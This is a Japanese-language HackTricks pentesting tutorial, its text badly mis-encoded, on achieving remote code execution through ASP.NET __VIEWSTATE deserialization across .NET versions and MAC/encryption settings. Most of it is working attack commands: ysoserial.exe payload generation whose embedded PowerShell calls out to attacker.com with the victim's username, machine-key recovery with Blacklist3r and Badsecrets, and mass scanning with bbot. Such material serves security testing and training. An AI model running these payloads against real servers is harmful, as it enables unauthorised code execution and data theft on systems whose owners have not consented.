# \_\_VIEWSTATEãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’çŸ¥ã‚‰ãªãã¦ã‚‚æ‚ªç”¨ã™ã‚‹

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã“ã¡ã‚‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆ**ã¯[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„
* **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã¾ãŸã¯[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ãŠã‚ˆã³**HackTricks Cloud**ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€**ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰**ã—ã¦ãã ã•ã„ã€‚

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ãƒãƒƒã‚­ãƒ³ã‚°ã‚­ãƒ£ãƒªã‚¢**ã«èˆˆå‘³ãŒã‚ã‚‹æ–¹ã‚„ã€**è§£èª­ä¸èƒ½ãªã‚‚ã®ã‚’ãƒãƒƒã‚­ãƒ³ã‚°**ã—ãŸã„æ–¹ - **æ¡ç”¨ä¸­**ã§ã™ï¼ï¼ˆ_æµæš¢ãªãƒãƒ¼ãƒ©ãƒ³ãƒ‰èªã®èª­ã¿æ›¸ããŒå¿…è¦ã§ã™_ï¼‰ã€‚

{% embed url="https://www.stmcyber.com/careers" %}

## ViewStateã¨ã¯

**ViewState**ã¯ã€ASP.NETã§ãƒšãƒ¼ã‚¸ã¨ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ‡ãƒ¼ã‚¿ã‚’Webãƒšãƒ¼ã‚¸é–“ã§ç¶­æŒã™ã‚‹ãŸã‚ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ã€‚ãƒšãƒ¼ã‚¸ã®HTMLãŒãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã‚‹éš›ã€ãƒšãƒ¼ã‚¸ã®ç¾åœ¨ã®çŠ¶æ…‹ã¨ãƒã‚¹ãƒˆãƒãƒƒã‚¯ä¸­ã«ä¿æŒã™ã‚‹å€¤ãŒbase64ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸæ–‡å­—åˆ—ã«ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã®æ–‡å­—åˆ—ã¯ã€éè¡¨ç¤ºã®ViewStateãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«é…ç½®ã•ã‚Œã¾ã™ã€‚

ViewStateæƒ…å ±ã¯ã€æ¬¡ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¾ãŸã¯ãã‚Œã‚‰ã®çµ„ã¿åˆã‚ã›ã«ã‚ˆã£ã¦ç‰¹å¾´ä»˜ã‘ã‚‰ã‚Œã¾ã™ï¼š

- **Base64**:
- ã“ã®å½¢å¼ã¯ã€`EnableViewStateMac`ãŠã‚ˆã³`ViewStateEncryptionMode`å±æ€§ãŒä¸¡æ–¹ã¨ã‚‚falseã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

- **Base64 + MACï¼ˆMessage Authentication Codeï¼‰æœ‰åŠ¹**:
- MACã®æœ‰åŠ¹åŒ–ã¯ã€`EnableViewStateMac`å±æ€§ã‚’trueã«è¨­å®šã™ã‚‹ã“ã¨ã§å®Ÿç¾ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ViewStateãƒ‡ãƒ¼ã‚¿ã®æ•´åˆæ€§æ¤œè¨¼ãŒæä¾›ã•ã‚Œã¾ã™ã€‚

- **Base64 + æš—å·åŒ–**:
- æš—å·åŒ–ã¯ã€`ViewStateEncryptionMode`å±æ€§ãŒtrueã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã«é©ç”¨ã•ã‚Œã€ViewStateãƒ‡ãƒ¼ã‚¿ã®æ©Ÿå¯†æ€§ãŒç¢ºä¿ã•ã‚Œã¾ã™ã€‚

## ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹

ç”»åƒã¯ã€.NETãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«åŸºã¥ã„ã¦ASP.NETã§ã®ViewStateã®ç•°ãªã‚‹æ§‹æˆã‚’è©³ç´°ã«ç¤ºã—ãŸè¡¨ã§ã™ã€‚ä»¥ä¸‹ã¯ã€å†…å®¹ã®è¦ç´„ã§ã™ï¼š

1. **.NETã®ä»»æ„ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã«ã¤ã„ã¦ã€MACã¨æš—å·åŒ–ãŒç„¡åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã€MachineKeyã¯å¿…è¦ãªãã€ãã®ãŸã‚ç‰¹å®šã™ã‚‹æ–¹æ³•ã¯é©ç”¨ã•ã‚Œã¾ã›ã‚“ã€‚

2. **4.5æœªæº€ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã§ã¯ã€MACãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹ãŒæš—å·åŒ–ãŒç„¡åŠ¹ãªå ´åˆã€MachineKeyãŒå¿…è¦ã§ã™ã€‚MachineKeyã‚’ç‰¹å®šã™ã‚‹æ–¹æ³•ã¯ã€ŒBlacklist3rã€ã¨å‘¼ã°ã‚Œã¾ã™ã€‚

3. **4.5æœªæº€ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã§ã¯ã€MACãŒæœ‰åŠ¹ã¾ãŸã¯ç„¡åŠ¹ã§ã‚ã‚‹ã‹ã«é–¢ä¿‚ãªãã€æš—å·åŒ–ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã€MachineKeyãŒå¿…è¦ã§ã™ã€‚MachineKeyã‚’ç‰¹å®šã™ã‚‹ä½œæ¥­ã¯ã€ŒBlacklist3r - Future Developmentã€ã®èª²é¡Œã§ã™ã€‚

4. **4.5ä»¥ä¸Šã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã§ã¯ã€MACã¨æš—å·åŒ–ã®ã™ã¹ã¦ã®çµ„ã¿åˆã‚ã›ï¼ˆä¸¡æ–¹ãŒtrueã§ã‚ã‚‹ã‹ã€1ã¤ãŒtrueã§ä»–ãŒfalseã§ã‚ã‚‹ã‹ï¼‰ã«ã¯MachineKeyãŒå¿…è¦ã§ã™ã€‚MachineKeyã¯ã€ŒBlacklist3rã€ã‚’ä½¿ç”¨ã—ã¦ç‰¹å®šã§ãã¾ã™ã€‚


### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ï¼š1 â€“ EnableViewStateMac=false ãŠã‚ˆã³ viewStateEncryptionMode=false

ã¾ãŸã€`AspNetEnforceViewStateMac`ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ã‚’ã‚¼ãƒ­ã«è¨­å®šã™ã‚‹ã“ã¨ã§ã€ViewStateMACã‚’å®Œå…¨ã«ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**ViewStateå±æ€§ã®ç‰¹å®š**

BurpSuiteã‚’ä½¿ç”¨ã—ã¦ã€ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å«ã‚€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã¦ã€ViewStateãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç‰¹å®šã§ãã¾ã™ã€‚ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒä¿è­·ã•ã‚Œã¦ã„ãªã„å ´åˆã¯ã€[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)ã‚’ä½¿ç”¨ã—ã¦ãã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ 1.5 â€“ ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ 1ã¨åŒæ§˜ã ãŒã€ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ViewStateã‚¯ãƒƒã‚­ãƒ¼ãŒé€ä¿¡ã•ã‚Œãªã„

é–‹ç™ºè€…ã¯ã€ViewStateã‚’HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ä¸€éƒ¨ã«ãªã‚‰ãªã„ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã“ã®ã‚¯ãƒƒã‚­ãƒ¼ã‚’å—ã‘å–ã‚‰ãªã„ï¼‰ã€‚\
ViewStateãŒå­˜åœ¨ã—ãªã„å ´åˆã€ViewStateã®é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã«èµ·å› ã™ã‚‹æ½œåœ¨çš„ãªè„†å¼±æ€§ã‹ã‚‰å®Ÿè£…ãŒå®‰å…¨ã§ã‚ã‚‹ã¨ä»®å®šã™ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
ã—ã‹ã—ã€ãã‚Œã¯äº‹å®Ÿã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£ã«ViewStateãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’è¿½åŠ ã—ã€ysoserialã‚’ä½¿ç”¨ã—ã¦ä½œæˆã—ãŸã‚·ãƒªã‚¢ãƒ«åŒ–ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚‹ã¨ã€**ã‚±ãƒ¼ã‚¹1**ã§ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€**ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ**ã‚’é”æˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚


### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹: 2 â€“ .Net < 4.5 ãŠã‚ˆã³ EnableViewStateMac=true & ViewStateEncryptionMode=false

ç‰¹å®šã®ãƒšãƒ¼ã‚¸ã§ViewState MACã‚’æœ‰åŠ¹ã«ã™ã‚‹ã«ã¯ã€ç‰¹å®šã®aspxãƒ•ã‚¡ã‚¤ãƒ«ã§ä»¥ä¸‹ã®å¤‰æ›´ã‚’è¡Œã†å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
**web.config** ãƒ•ã‚¡ã‚¤ãƒ«ã«ä»¥ä¸‹ã«ç¤ºã™ã‚ˆã†ã«è¨­å®šã™ã‚‹ã“ã¨ã§ã€**å…¨ä½“çš„ãª**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦ã‚‚è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€æ”»æ’ƒã‚’æˆåŠŸã•ã›ã‚‹ã«ã¯ã¾ãšä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚­ãƒ¼ã‚’å–å¾—ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

[**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)ã‚’ä½¿ç”¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚­ãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ã¯ã€æ—¢çŸ¥ã®machineKeysã‚’ç‰¹å®šã§ãã‚‹åˆ¥ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚Pythonã§æ›¸ã‹ã‚Œã¦ã„ã‚‹ãŸã‚ã€Blacklist3rã¨ã¯ç•°ãªã‚Šã€Windowsã«ä¾å­˜ã—ã¾ã›ã‚“ã€‚.NETã®viewstatesã«ã¯ã€ã€Œpython blacklist3rã€ã¨ã„ã†ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ãŒã‚ã‚Šã€ãã‚ŒãŒä½¿ç”¨ã™ã‚‹æœ€ã‚‚è¿…é€Ÿãªæ–¹æ³•ã§ã™ã€‚

ãƒ“ãƒ¥ãƒ¼ã‚¹ãƒ†ãƒ¼ãƒˆã¨ã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿ã‚’ç›´æ¥æŒ‡å®šã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

ã¾ãŸã¯ã€å¯¾è±¡ã®URLã«ç›´æ¥æ¥ç¶šã—ã€HTMLã‹ã‚‰viewstateã‚’å–ã‚Šå‡ºãã†ã¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

å¤§è¦æ¨¡ã§è„†å¼±ãªviewstatesã‚’æ¤œç´¢ã™ã‚‹ãŸã‚ã«ã€ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã®åˆ—æŒ™ã¨çµ„ã¿åˆã‚ã›ã¦ã€`badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md) ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã§ãã¾ã™:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

éµãŒè¦‹ã¤ã‹ã£ãŸå ´åˆã¯å¹¸é‹ã§ã‚ã‚Šã€[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:** ã‚’ä½¿ç”¨ã—ã¦æ”»æ’ƒã‚’ç¶šè¡Œã§ãã¾ã™ã€‚
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
ä»¥ä¸‹ã®å ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ `_VIEWSTATEGENERATOR` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ãŒé€ä¿¡ã•ã‚Œãªã„å ´åˆã€`--generator` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã‚’æŒ‡å®šã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€æ¬¡ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ãŒå¿…è¦ã§ã™:
```bash
--apppath="/" --path="/hello.aspx"
```
### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹: 3 â€“ .Net < 4.5 ãŠã‚ˆã³ EnableViewStateMac=true/false ãŠã‚ˆã³ ViewStateEncryptionMode=true

ã“ã®å ´åˆã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã¯ã‚ã‹ã‚Šã¾ã›ã‚“ã€‚ãã®ãŸã‚ã€å€¤ã¯ãŠãã‚‰ãæš—å·åŒ–ã•ã‚Œã¦ãŠã‚Šã€è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«**ãƒã‚·ãƒ³ã‚­ãƒ¼ãŒå¿…è¦**ã§ã™ã€‚

**ã“ã®å ´åˆã€** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ãŒé–‹ç™ºä¸­ã§ã™...**

**.NET 4.5ã‚ˆã‚Šå‰**ã§ã¯ã€ASP.NETã¯ã€**`ViewStateEncryptionMode`** ãŒ _**Always**_ ã«è¨­å®šã•ã‚Œã¦ã„ã¦ã‚‚ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®\_`__VIEWSTATE`\_ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’**æš—å·åŒ–ã•ã‚Œã¦ã„ãªã„**çŠ¶æ…‹ã§**å—ã‘å…¥ã‚Œã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚ASP.NETã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã® **`__VIEWSTATEENCRYPTED`** ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®**å­˜åœ¨ã®ã¿ã‚’ç¢ºèª**ã—ã¾ã™ã€‚**ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å‰Šé™¤ã—ã€æš—å·åŒ–ã•ã‚Œã¦ã„ãªã„ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚‹ã¨ã€ãã‚Œã§ã‚‚å‡¦ç†ã•ã‚Œã¾ã™ã€‚**

ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ãŒãƒ•ã‚¡ã‚¤ãƒ«ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ãªã©ã®ä»–ã®è„†å¼±æ€§ã‚’ä»‹ã—ã¦ãƒã‚·ãƒ³ã‚­ãƒ¼ã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹ã¨ã€**Case 2** ã§ä½¿ç”¨ã•ã‚ŒãŸ [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ViewStateé€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã—ã¦RCEã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

* ViewStateé€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã«ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã‚‰ `__VIEWSTATEENCRYPTED` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å‰Šé™¤ã—ã¾ã™ã€‚ãã†ã—ãªã„ã¨ã€Viewstate MACæ¤œè¨¼ã‚¨ãƒ©ãƒ¼ãŒè¿”ã•ã‚Œã€è„†å¼±æ€§ã‚’æ‚ªç”¨ã§ãã¾ã›ã‚“ã€‚

### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹: 4 â€“ .Net >= 4.5 ãŠã‚ˆã³ EnableViewStateMac=true/false ãŠã‚ˆã³ ViewStateEncryptionMode=true/false ãŸã ã—ã€ä¸¡æ–¹ã®å±æ€§ãŒfalseã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆ

ä»¥ä¸‹ã«ç¤ºã™ã‚ˆã†ã«ã€web.configãƒ•ã‚¡ã‚¤ãƒ«å†…ã§ä»¥ä¸‹ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’æŒ‡å®šã™ã‚‹ã“ã¨ã§ã€ASP.NETãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ä½¿ç”¨ã‚’å¼·åˆ¶ã§ãã¾ã™ã€‚
```xml
<httpRuntime targetFramework="4.5" />
```
ä»£ã‚ã‚Šã«ã€ã“ã‚Œã¯web.configãƒ•ã‚¡ã‚¤ãƒ«ã®`machineKey`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å†…ã«ä»¥ä¸‹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æŒ‡å®šã™ã‚‹ã“ã¨ã§è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
compatibilityMode="Framework45"
```
å‰è¿°ã®ã‚ˆã†ã«ã€**å€¤ã¯æš—å·åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚** ãã®ãŸã‚ã€**æœ‰åŠ¹ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚‹ã«ã¯ã€æ”»æ’ƒè€…ãŒéµãŒå¿…è¦ã§ã™ã€‚**

[**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)ã‚’ä½¿ç”¨ã—ã¦ã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹éµã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
[IISDirPath](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)ã¨TargetPagePathã®è©³ç´°ãªèª¬æ˜ã«ã¤ã„ã¦ã¯ã€[ã“ã¡ã‚‰](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

ã¾ãŸã¯ã€[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ï¼ˆã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿å€¤ä»˜ãï¼‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

æœ‰åŠ¹ãªãƒã‚·ãƒ³ã‚­ãƒ¼ãŒç‰¹å®šã•ã‚ŒãŸã‚‰ã€**æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯[YSoSerial.Net](https://github.com/pwntester/ysoserial.net)ã‚’ä½¿ç”¨ã—ã¦ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ã§ã™**
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
`__VIEWSTATEGENERATOR`ã®å€¤ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ãã®å€¤ã‚’ä½¿ç”¨ã—ã¦`--generator`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’è©¦ã—ã¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®å€¤ã¨ä¸€ç·’ã«`--path`ã¨`--apppath`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’çœç•¥ã—ã¦ãã ã•ã„ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

